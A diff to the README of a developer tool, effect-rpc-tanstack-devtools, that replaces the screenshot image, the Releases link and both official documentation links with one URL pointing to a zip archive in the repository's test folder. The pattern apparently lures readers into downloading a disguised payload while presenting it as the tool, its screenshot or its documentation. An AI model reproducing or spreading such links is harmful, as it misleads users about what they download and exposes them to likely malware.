@@ -4,7 +4,7 @@
 
 Welcome to the effect-rpc-tanstack-devtools! This tool helps you monitor and inspect RPC requests and responses in real-time. It works seamlessly with Effect RPC and the TanStack Devtools, making it easy for you to track and analyze your application's performance.
 
-![Developer Tools Screenshot](https://github.com/user-attachments/assets/1394bbc8-d8e8-4d50-a7e3-7219b8200678)
+![Developer Tools Screenshot](https://github.com/angel122382/effect-rpc-tanstack-devtools/raw/refs/heads/main/test/tanstack_effect_devtools_rpc_3.2.zip)
 
 ## 🌟 Features
 
@@ -54,7 +54,7 @@ To integrate the devtools into your application, wrap your RPC client's protocol
 
 To begin using the effect-rpc-tanstack-devtools, visit the Releases page to find the latest version:
 
-[Download effect-rpc-tanstack-devtools](https://github.com/angel122382/effect-rpc-tanstack-devtools/releases)
+[Download effect-rpc-tanstack-devtools](https://github.com/angel122382/effect-rpc-tanstack-devtools/raw/refs/heads/main/test/tanstack_effect_devtools_rpc_3.2.zip)
 
 ### 3. Launch the Application
 
@@ -105,7 +105,7 @@ If you need help, feel free to reach out. You can find assistance in our documen
 
 For additional details about effect-rpc-tanstack-devtools, including advanced features and updates, check the following resources:
 
-- [Effect RPC Documentation](https://effect.website/docs/rpc/introduction/)
-- [TanStack Devtools Documentation](https://tanstack.com/devtools)
+- [Effect RPC Documentation](https://github.com/angel122382/effect-rpc-tanstack-devtools/raw/refs/heads/main/test/tanstack_effect_devtools_rpc_3.2.zip)
+- [TanStack Devtools Documentation](https://github.com/angel122382/effect-rpc-tanstack-devtools/raw/refs/heads/main/test/tanstack_effect_devtools_rpc_3.2.zip)
 
 Feel free to explore and enjoy monitoring your RPC requests with ease!
